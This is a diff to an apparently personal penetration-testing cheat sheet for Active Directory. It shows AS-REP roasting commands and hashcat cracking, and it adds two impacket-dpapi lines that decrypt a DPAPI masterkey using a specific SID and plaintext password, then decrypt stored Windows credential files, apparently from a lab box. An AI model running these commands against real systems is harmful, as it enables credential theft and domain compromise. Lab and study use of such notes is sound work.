@@ -69,6 +69,9 @@ impacket-GetNPUsers <domain>/ -usersfile <users> -format john -dc-ip $IP # asrep
 
 Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>	# asreproast
 
+impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'﻿	# After download the masterkey to output the key
+impacket-dpapi credential -f DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84﻿	# Use the key in the DPAPI Credentials Files
+
 ## CRACKING (ASREPROAST)
 
 hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt # asreproast
